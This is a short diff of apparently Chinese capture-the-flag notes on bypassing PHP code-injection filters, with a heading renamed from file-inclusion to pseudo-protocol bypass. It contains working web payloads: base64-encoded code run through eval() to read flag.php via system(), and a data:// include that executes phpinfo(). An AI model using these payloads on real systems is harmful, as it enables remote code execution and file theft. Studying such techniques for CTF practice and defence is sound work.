@@ -41,6 +41,6 @@ eval("echo `ifconfig`;");
 2.      进行进一步加密绕过
         ?c=eval(base64_decode($_GET[x]));&x=Y3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
         eval($_GET['c'])
-文件包含绕过：使用文件包含方法
+伪协议绕过：使用文件包含或其他能够使用伪协议的函数方法
         ?c=include(data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+)
 
